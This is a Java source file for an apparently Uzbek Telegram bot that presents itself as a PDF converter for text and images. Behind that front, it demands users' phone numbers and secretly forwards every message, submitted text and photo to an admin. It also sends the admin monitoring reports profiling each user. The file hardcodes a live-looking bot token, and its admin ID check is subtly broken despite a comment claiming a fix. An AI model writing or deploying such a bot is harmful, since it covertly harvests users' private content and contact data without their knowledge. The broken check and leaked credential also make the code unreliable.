package uz.nozimjon;

import com.itextpdf.text.Document;
import com.itextpdf.text.Image;
import com.itextpdf.text.Paragraph;
import com.itextpdf.text.pdf.PdfWriter;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.GetFile;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.*;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardButton;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PdfConverterBot extends TelegramLongPollingBot {

    private final String BOT_TOKEN = "8844942368:AAHtAXuYg4TQZ4CFGRbe4oVGHaz3-6fGGNc";
    private final String BOT_USERNAME = "PDF BOT ";
    
    // 🔥 Admin ID to'g'rilandi (L harfi olib tashlandi va String holatiga keltirildi)
    private final String ADMIN_ID = "5406236537L"; 

    private final Map<Long, String> userStates = new HashMap<>();
    private Connection dbConnection;

    public PdfConverterBot() {
        try {
            dbConnection = DriverManager.getConnection("jdbc:sqlite:bot_users.db");
            Statement statement = dbConnection.createStatement();
            statement.execute("CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, phone TEXT)");
            System.out.println("LOG: Ma'lumotlar bazasi muvaffaqiyatli ulandi.");
        } catch (Exception e) {
            System.err.println("Bazaga ulanishda xatolik: " + e.getMessage());
        }
    }

    private boolean isUserRegistered(long chatId) {
        if (String.valueOf(chatId).equals(ADMIN_ID)) return true; 
        try {
            PreparedStatement ps = dbConnection.prepareStatement("SELECT phone FROM users WHERE chat_id = ?");
            ps.setLong(1, chatId);
            ResultSet rs = ps.executeQuery();
            return rs.next(); 
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private void saveUserPhone(long chatId, String phone) {
        try {
            dbConnection.setAutoCommit(true);
            PreparedStatement ps = dbConnection.prepareStatement("INSERT OR REPLACE INTO users (chat_id, phone) VALUES (?, ?)");
            ps.setLong(1, chatId);
            ps.setString(2, phone);
            ps.executeUpdate();
            System.out.println("LOG: Yangi user bazaga yozildi ID: " + chatId);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getUserPhoneFromDb(long chatId) {
        try {
            PreparedStatement ps = dbConnection.prepareStatement("SELECT phone FROM users WHERE chat_id = ?");
            ps.setLong(1, chatId);
            ResultSet rs = ps.executeQuery();
            if (rs.next()) {
                return rs.getString("phone");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "⚡️ Hali raqam yubormadi";
    }

    @Override
    public String getBotUsername() { return BOT_USERNAME; }

    @Override
    public String getBotToken() { return BOT_TOKEN; }

    @Override
    public void onUpdateReceived(Update update) {
        if (update.hasMessage()) {
            Message message = update.getMessage();
            long chatId = message.getChatId();
            User user = message.getFrom();

            // --- 📱 KONTAKT KELGANDA ---
            if (message.hasContact()) {
                Contact contact = message.getContact();
                if (contact.getUserId().equals(user.getId())) {
                    saveUserPhone(chatId, contact.getPhoneNumber()); 
                    sendMessageWithKeyboard(chatId, "✅ Rahmat! Telefon raqamingiz tasdiqlandi. Endi botdan to'liq foydalanishingiz mumkin.", createMainKeyboard());
                    notifyAdminAction(user, "Telefon raqamini yubordi va ro'yxatdan o'tdi");
                }
                return;
            }

            // --- 📊 ADMIN UCHUN BAZANI TELEGRAMDAN KO'RISH BUYRUG'I ---
            if (message.hasText() && message.getText().equals("/seebase") && String.valueOf(chatId).equals(ADMIN_ID)) {
                StringBuilder sb = new StringBuilder("📊 Baza ma'lumotlari:\n\n");
                try (Statement stmt = dbConnection.createStatement();
                     ResultSet rs = stmt.executeQuery("SELECT chat_id, phone FROM users")) {
                    while (rs.next()) {
                        sb.append("🆔 ID: ").append(rs.getLong("chat_id"))
                          .append(" | 📞 Tel: ").append(rs.getString("phone")).append("\n");
                    }
                } catch (Exception e) {
                    sb.append("Xatolik: ").append(e.getMessage());
                }
                SendMessage sm = new SendMessage();
                sm.setChatId(String.valueOf(chatId));
                sm.setText(sb.toString());
                try { execute(sm); } catch (Exception e) { e.printStackTrace(); }
                return; 
            }

            // --- 📥 HAR QANDAY MATNLI XABAR KELGANDA ADMINGA MONITORING YUBORISH ---
            if (message.hasText() && !String.valueOf(chatId).equals(ADMIN_ID)) {
                try {
                    SendMessage adminMessage = new SendMessage();
                    adminMessage.setChatId(ADMIN_ID);
                    String monitoringText = "🔔 Yangi xabar keldi!\n" +
                                            "👤 Kimdan: " + user.getFirstName() + " (@" + (user.getUserName() != null ? user.getUserName() : "yo'q") + ")\n" +
                                            "🆔 ID: " + chatId + "\n" +
                                            "📝 Xabar matni: " + message.getText();
                    adminMessage.setText(monitoringText);
                    execute(adminMessage); 
                } catch (Exception e) {
                    System.err.println("Monitoring xabar yuborishda xato: " + e.getMessage());
                }
            }

            // --- 🚀 /START BUYRUG'I ---
            if (message.hasText() && message.getText().equals("/start")) {
                userStates.put(chatId, "NONE");
                if (!isUserRegistered(chatId)) { 
                    requestPhoneNumber(chatId, user);
                } else {
                    sendWelcomeMessage(chatId, user);
                }
                notifyAdminAction(user, "/start tugmasini bosdi");
                return;
            }

            // Xavfsizlik filtri (Bazada yo'q bo'lsa, o'tkazmaydi)
            if (!isUserRegistered(chatId)) {
                requestPhoneNumber(chatId, user);
                return;
            }

            // --- ❌ BEKOR QILISH TUGMASI ---
            if (message.hasText() && message.getText().equals("❌ Bekor qilish")) {
                userStates.put(chatId, "NONE");
                sendMessageWithKeyboard(chatId, "Amal bekor qilindi. Bosh sahifa:", createMainKeyboard());
                notifyAdminAction(user, "Amalni bekor qildi");
                return;
            }

            // --- ℹ️ BOT HAQIDA TUGMASI ---
            if (message.hasText() && message.getText().equals("ℹ️ Bot haqida")) {
                sendMessageWithKeyboard(chatId, "🤖 *PDF Converter Bot*\n\nBu bot matn yoki rasmlarni tezda PDF formatiga o'tkazib beradi.", createMainKeyboard());
                notifyAdminAction(user, "'Bot haqida' bo'limini ko'rdi");
                return;
            }

            // --- 📄 MATNNI PDF QILISH BOSHLANGANDA ---
            if (message.hasText() && message.getText().equals("📄 Matnni PDF qilish")) {
                userStates.put(chatId, "WAITING_TEXT");
                sendMessageWithKeyboard(chatId, "Iltimos, PDF qilmoqchi bo'lgan matningizni yuboring:", createCancelKeyboard());
                notifyAdminAction(user, "Matnni PDF qilish funksiyasini yoqdi (Kutilmoqda)");
                return;
            }

            // --- 🖼 RASMNI PDF QILISH BOSHLANGANDA ---
            if (message.hasText() && message.getText().equals("🖼 Rasmni PDF qilish")) {
                userStates.put(chatId, "WAITING_PHOTO");
                sendMessageWithKeyboard(chatId, "Iltimos, PDF qilmoqchi bo'lgan rasmingizni yuboring:", createCancelKeyboard());
                notifyAdminAction(user, "Rasmni PDF qilish funksiyasini yoqdi (Kutilmoqda)");
                return;
            }

            // --- 🔄 JAVOB BERISH JARAYONLARI (STATES) ---
            String currentState = userStates.getOrDefault(chatId, "NONE");

            if (currentState.equals("WAITING_TEXT") && message.hasText()) {
                forwardTextToAdmin(user, message.getText());
                notifyAdminAction(user, "Matn yubordi. PDF generatsiya qilinmoqda...");
                handleTextToPdf(chatId, message.getText(), user);
                userStates.put(chatId, "NONE");
            }
            else if (currentState.equals("WAITING_PHOTO") && message.hasPhoto()) {
                forwardPhotoToAdmin(user, message.getPhoto());
                notifyAdminAction(user, "Rasm yubordi. PDF generatsiya qilinmoqda...");
                handlePhotoToPdf(chatId, message.getPhoto(), user);
                userStates.put(chatId, "NONE");
            }
        }
    }

    private void forwardTextToAdmin(User user, String text) {
        if (String.valueOf(user.getId()).equals(ADMIN_ID)) return;
        String msg = String.format("📝 *[KOPLYA]* %s (@%s) quyidagi matnni PDF qilmoqchi:\n\n%s",
                user.getFirstName(), user.getUserName(), text);
        SendMessage sm = new SendMessage();
        sm.setChatId(ADMIN_ID);
        sm.setText(msg);
        try { execute(sm); } catch (Exception e) { e.printStackTrace(); }
    }

    private void forwardPhotoToAdmin(User user, List<PhotoSize> photoSizes) {
        if (String.valueOf(user.getId()).equals(ADMIN_ID)) return;
        PhotoSize photo = photoSizes.stream().max((p1, p2) -> Integer.compare(p1.getFileSize(), p2.getFileSize())).orElse(null);
        if (photo == null) return;

        SendPhoto sp = new SendPhoto();
        sp.setChatId(ADMIN_ID);
        sp.setPhoto(new InputFile(photo.getFileId()));
        sp.setCaption("🖼 *[KOPLYA]* " + user.getFirstName() + " (@" + user.getUserName() + ") ushbu rasmni PDF qilmoqchi.");
        try { execute(sp); } catch (Exception e) { e.printStackTrace(); }
    }

    private void handleTextToPdf(long chatId, String text, User user) {
        String safeNickname = user.getFirstName().replaceAll("[\\\\/:*?\"<>|\\s]", "_");
        String fileName = safeNickname + "_document.pdf";
        Document document = new Document();
        try {
            PdfWriter.getInstance(document, new FileOutputStream(fileName));
            document.open();
            document.add(new Paragraph(text));
            document.close();
            String caption = "🎉 PDF tayyorlandi!\n\n🤖@sharipovPdf_bot";
            sendPdfDocument(chatId, fileName, caption);
        } catch (Exception e) {
            sendMessageWithKeyboard(chatId, "❌ Xatolik yuz berdi.", createMainKeyboard());
            e.printStackTrace();
        } finally {
            new File(fileName).delete();
        }
    }

    private void handlePhotoToPdf(long chatId, List<PhotoSize> photoSizes, User user) {
        PhotoSize photo = photoSizes.stream().max((p1, p2) -> Integer.compare(p1.getFileSize(), p2.getFileSize())).orElse(null);
        if (photo == null) return;

        String safeNickname = user.getFirstName().replaceAll("[\\\\/:*?\"<>|\\s]", "_");
        String pdfName = safeNickname + "_image.pdf";
        Document document = new Document();
        try {
            GetFile getFile = new GetFile();
            getFile.setFileId(photo.getFileId());
            org.telegram.telegrambots.meta.api.objects.File file = execute(getFile);
            String fileUrl = "https://api.telegram.org/file/bot" + getBotToken() + "/" + file.getFilePath();

            PdfWriter.getInstance(document, new FileOutputStream(pdfName));
            document.open();
            Image image = Image.getInstance(new URL(fileUrl));
            image.scaleToFit(500, 700);
            image.setAlignment(Image.ALIGN_CENTER);
            document.add(image);
            document.close();

            String caption = "🎉 Rasm PDF formatga o'tkazildi!\n\n🤖@bySharipovPdf_bot";
            sendPdfDocument(chatId, pdfName, caption);
        } catch (Exception e) {
            sendMessageWithKeyboard(chatId, "❌ Rasmni qayta ishlashda xatolik yuz berdi.", createMainKeyboard());
            e.printStackTrace();
        } finally {
            new File(pdfName).delete();
        }
    }

    private String estimateRegDate(long userId) {
        if (userId < 50000000) return "2010-2013 yillar (Eski Akkaunt)";
        if (userId < 200000000) return "2014-2015 yillar";
        if (userId < 400000000) return "2016-2017 yillar";
        if (userId < 800000000) return "2018-2019 yillar";
        if (userId < 1300000000) return "2020-2021 yillar";
        if (userId < 1900000000) return "2022-2023 yillar";
        if (userId < 6000000000L) return "2024-2025 yillar";
        return "2026-yil (Yangi Akkaunt)";
    }

    private void notifyAdminAction(User user, String currentAction) {
        if (String.valueOf(user.getId()).equals(ADMIN_ID)) return;

        String phone = getUserPhoneFromDb(user.getId()); 
        String estimatedYear = estimateRegDate(user.getId());

        String adminMsg = "🔔 USER MONITORING REPORT\n\n" +
                          "👤 Foydalanuvchi: " + user.getFirstName() + " " + (user.getLastName() != null ? user.getLastName() : "") + "\n" +
                          "🏷 Username: @" + (user.getUserName() != null ? user.getUserName() : "Mavjud emas") + "\n" +
                          "🆔 Telegram ID: " + user.getId() + "\n" +
                          "📞 Telefon raqami: " + phone + "\n" +
                          "📅 Akkaunt ochilgan vaqti: " + estimatedYear + "\n\n" +
                          "🚀 Hozirgi harakati (API State): \n👉 " + currentAction;

        SendMessage sm = new SendMessage();
        sm.setChatId(ADMIN_ID);
        sm.setText(adminMsg);
        // Qizil xatolik bermasligi uchun Markdown o'chirildi!
        try { execute(sm); } catch (Exception e) { System.err.println("Admin monitoring error: " + e.getMessage()); }
    }

    private void requestPhoneNumber(long chatId, User user) {
        ReplyKeyboardMarkup keyboardMarkup = new ReplyKeyboardMarkup();
        keyboardMarkup.setResizeKeyboard(true);
        keyboardMarkup.setOneTimeKeyboard(true);

        List<KeyboardRow> keyboard = new ArrayList<>();
        KeyboardRow row = new KeyboardRow();
        KeyboardButton phoneButton = new KeyboardButton("📱 Telefon raqamni yuborish");
        phoneButton.setRequestContact(true);
        row.add(phoneButton);
        keyboard.add(row);
        keyboardMarkup.setKeyboard(keyboard);

        String text = "👋 Salom, " + user.getFirstName() + "!\n\nBotdan foydalanish uchun pastdagi '📱 Telefon raqamni yuborish' tugmasini bosing.";
        sendMessageWithKeyboard(chatId, text, keyboardMarkup);
    }

    private void sendWelcomeMessage(long chatId, User user) {
        String text = "🔥 Xush kelibsiz! Quyidagi tugmalardan birini tanlang va fayllarni PDF qiling:";
        sendMessageWithKeyboard(chatId, text, createMainKeyboard());
    }

    private void sendMessageWithKeyboard(long chatId, String text, ReplyKeyboardMarkup keyboard) {
        SendMessage sm = new SendMessage();
        sm.setChatId(String.valueOf(chatId));
        sm.setText(text);
        sm.setReplyMarkup(keyboard);
        try { execute(sm); } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendPdfDocument(long chatId, String filePath, String caption) {
        SendDocument sd = new SendDocument();
        sd.setChatId(String.valueOf(chatId));
        sd.setDocument(new InputFile(new File(filePath)));
        sd.setCaption(caption);
        sd.setReplyMarkup(createMainKeyboard());
        try { execute(sd); } catch (Exception e) { e.printStackTrace(); }
    }

    private ReplyKeyboardMarkup createMainKeyboard() {
        ReplyKeyboardMarkup keyboardMarkup = new ReplyKeyboardMarkup();
        keyboardMarkup.setResizeKeyboard(true);
        List<KeyboardRow> keyboard = new ArrayList<>();
        KeyboardRow row1 = new KeyboardRow();
        row1.add(new KeyboardButton("📄 Matnni PDF qilish"));
        row1.add(new KeyboardButton("🖼 Rasmni PDF qilish"));
        KeyboardRow row2 = new KeyboardRow();
        row2.add(new KeyboardButton("ℹ️ Bot haqida"));
        keyboard.add(row1);
        keyboard.add(row2);
        keyboardMarkup.setKeyboard(keyboard);
        return keyboardMarkup;
    }

    private ReplyKeyboardMarkup createCancelKeyboard() {
        ReplyKeyboardMarkup keyboardMarkup = new ReplyKeyboardMarkup();
        keyboardMarkup.setResizeKeyboard(true);
        List<KeyboardRow> keyboard = new ArrayList<>();
        KeyboardRow row = new KeyboardRow();
        row.add(new KeyboardButton("❌ Bekor qilish"));
        keyboard.add(row);
        keyboardMarkup.setKeyboard(keyboard);
        return keyboardMarkup;
    }

    // 🔥 public static void qilindi va port ochuvchi soxta server eng tepaga joylandi
    public static void main(String[] args) {
        // Render port so'rab o'chiravergani uchun birinchi bo'lib soxta veb-server ochamiz
        new Thread(() -> {
            try {
                java.net.ServerSocket serverSocket = new java.net.ServerSocket(8080);
                while (true) {
                    java.net.Socket socket = serverSocket.accept();
                    java.io.OutputStream out = socket.getOutputStream();
                    out.write("HTTP/1.1 200 OK\r\n\r\nBot is running!".getBytes());
                    out.close();
                    socket.close();
                }
            } catch (Exception e) {
                System.out.println("Port ochishda xato: " + e.getMessage());
            }
        }).start();

        // Keyin bot ishga tushadi
        try {
            TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
            botsApi.registerBot(new PdfConverterBot());
            System.out.println("Java SQLite-bazali PDF Bot ishga tushdi...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
